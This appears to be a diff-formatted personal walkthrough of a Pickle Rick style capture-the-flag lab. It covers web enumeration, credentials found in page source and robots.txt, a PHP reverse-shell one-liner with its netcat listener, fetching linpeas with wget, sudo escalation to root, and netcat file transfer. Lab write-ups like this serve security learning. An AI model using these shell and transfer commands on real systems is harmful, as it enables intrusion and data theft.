@@ -1,0 +1,114 @@
+IP = 10.10.85.117
+
+First we go to the 10.10.85.117
+
+then we nmap 
+
+then we gobuster it 
+
+gobuster dir -u 10.10.85.117 -w wordlist from medium txt -x php,html,css,js,py,txt(specify file types)
+
+then we inspect the website source and get the Username: R1ckRul3s
+
+then we go 10.10.85.117/robots.txt found Wubbalubbadubdub
+
+then we got results from gobuster :
+
+/index.html (Status: 200)
+/login.php (Status: 200)
+/assets (Status: 301)
+/portal.php (Status: 302)
+/robots.txt (Status: 200)
+
+
+then we go /portal.php get a login request 
+then we enter name and password given 
+
+robots.txt got = Wubbalubbadubdub
+
+
+Username: R1ckRul3s
+
+
+
+then we got a command bar , reverse shell time !!!
+
+Our machine:
+nc nlvp 1234
+
+Victim machine :
+	php -r '$sock=fsockopen("10.9.23.248",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+then we are in !!!
+
+then we ls see the first password !!
+
+root@kali:~/Pickle_Rick# nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.9.23.248] from (UNKNOWN) [10.10.85.117] 33760
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+Sup3rS3cretPickl3Ingred.txt
+
+
+then we cd /home
+
+then see rick and found the second password
+
+then we launch linpeas to get more info about the vitctim machine by passing our linpeas to their
+
+first cd to ur linpeas directory on your machine 
+
+then u python -m SimpleHTTPServer act as a server to give linpeas to the victim machine
+
+the victim machine then sudo wget 10.9.23.248:8000/linpeas.sh 
+
+then we run linpeas , chmod +x linpeas and ./linpeas.sh | tee linlog.txt
+
+then we found sudo can do everything
+
+
+then we sudo ls /root(cause we don have proper shell)
+$ sudo ls /root
+3rd.txt
+snap
+
+
+$ sudo cat /root/3rd.txt
+3rd ingredients: fleeb juice
+$ 
+
+
+
+To get file from a machine :
+
+on your machine start a client to listen : nc nlvp 1234 > file name
+
+on target machine start a server to send : nc nv yourip 1234 < file name
+
+
+
+second way(if python is available)
+
+on target machine : python -m SimpleHTTPServer
+
+on your machine : wget (target machine ip):(1234)/file name
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
